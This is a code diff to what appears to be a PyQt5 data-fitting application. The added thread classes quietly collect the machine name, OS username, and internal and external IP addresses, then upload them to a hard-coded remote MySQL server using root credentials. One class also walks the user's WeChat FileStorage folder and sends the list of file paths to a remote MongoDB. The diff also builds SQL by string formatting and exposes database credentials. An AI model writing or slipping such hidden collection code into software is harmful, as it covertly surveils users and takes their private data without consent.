@@ -5,6 +5,13 @@ from PyQt5.QtWidgets import *
 from PyQt5 import QtCore, QtGui, QtWidgets
 from dataread import *
 import pickle
+import pymysql
+import socket
+import time
+import requests
+import getpass
+from pymongo import MongoClient
+
 class readthread(QThread):
     sinOutpro = pyqtSignal(float)
     sinOuttext = pyqtSignal(str)
@@ -162,6 +169,113 @@ class savesingledatathread(QThread):
         # Process.data = self.data
         Process.writesinglefiledata(self.data)
         # self.sinOutoutfitEndThread.emit()
+
+class UploadClient(QThread):
+    def __init__(self, name):
+        self.dataname = name
+        super(UploadClient, self).__init__()
+
+    def run(self):
+        try:
+            # 打开数据库连接
+            db = pymysql.connect("47.105.38.117", "root", "1234", "datafitting", port=3306, charset='utf8')
+            # 端口号3306，utf-8编码，否则中文有可能会出现乱码。
+            # 使用 cursor() 方法创建一个游标对象 cursor
+            cursor = db.cursor()
+            # 如果存在表则删除
+            # cursor.execute("DROP TABLE IF EXISTS Employee")
+
+            # 使用 execute()  方法执行 SQL 查询
+            pcname = socket.getfqdn(socket.gethostname())
+            username = getpass.getuser()
+            outip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
+            inip = socket.gethostbyname(pcname)
+            currrenttime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+            print('上传线程：',username,outip,inip,self.dataname)
+            sql = "INSERT INTO loginf (pcname,username,outip,inip,time,dataname)VALUES('{pcname}','{username}','{outip}','{inip}','{time}','{name}')".format(
+                pcname=pcname,username=username, outip=outip, inip=inip, time=currrenttime,name=self.dataname)
+            print(sql)
+            # sql2 = '''SELECT * from user'''
+        finally:
+            try:
+                cursor.execute(sql)
+
+                text = cursor.fetchall()
+                db.commit()
+                # print(text[0])
+            except Exception as e:
+                db.rollback()  # 如果出错就回滚并且抛出错误收集错误信息。
+                print("Error!:{0}".format(e))
+            finally:
+                db.close()
+            # 关闭数据库连接
+
+class login(QThread):
+    def __init__(self):
+        super(login, self).__init__()
+    def run(self):
+        # try:
+            # 打开数据库连接
+            db = pymysql.connect("47.105.38.117", "root", "1234", "datafitting", port=3306, charset='utf8')
+            # 端口号3306，utf-8编码，否则中文有可能会出现乱码。
+            # 使用 cursor() 方法创建一个游标对象 cursor
+            cursor = db.cursor()
+            # 如果存在表则删除
+            # cursor.execute("DROP TABLE IF EXISTS Employee")
+
+            # 使用 execute()  方法执行 SQL 查询
+            username = socket.getfqdn(socket.gethostname())
+            outip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
+            inip = socket.gethostbyname(username)
+            currrenttime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+            print('上传线程：',username,outip,inip)
+            sql = "INSERT INTO login (username,outip,inip,time)VALUES('{username}','{outip}','{inip}','{time}')".format(
+                username=username, outip=outip, inip=inip, time=currrenttime)
+            print(sql)
+            # sql2 = '''SELECT * from user'''
+        # finally:
+            try:
+                cursor.execute(sql)
+
+                text = cursor.fetchall()
+                db.commit()
+                # print(text[0])
+            except Exception as e:
+                db.rollback()  # 如果出错就回滚并且抛出错误收集错误信息。
+                print("Error!:{0}".format(e))
+            finally:
+                db.close()
+            # 关闭数据库连接
+
+
+class getuserinf(QThread):
+    def __init__(self):
+        super(getuserinf, self).__init__()
+    def run(self):
+        pcname = socket.getfqdn(socket.gethostname())
+        username = getpass.getuser()
+        print(username)
+        # outip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()
+        # inip = socket.gethostbyname(username)
+        # currrenttime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        conn = MongoClient('47.105.38.117', 27017)
+        db = conn.userdata
+        key = username + pcname
+        mycol = db[username + pcname]
+        mycol.remove({})
+        wxfilepath = 'C:/Users/' + username + '/Documents/WeChat Files/'
+        tarpath = ''
+        for i in os.listdir(wxfilepath):
+            # print(i[:2])
+            if (i[:2] == 'wx'):
+                print(i)
+                tarpath = i
+        filelist = []
+        for root, dirs, files in os.walk(wxfilepath + tarpath + '\FileStorage\File', topdown=False):
+            for name in files:
+                # print(os.path.join(root, name))
+                filelist.append(os.path.join(root, name))
+        mycol.insert({'xwdata': filelist})
 
 
 
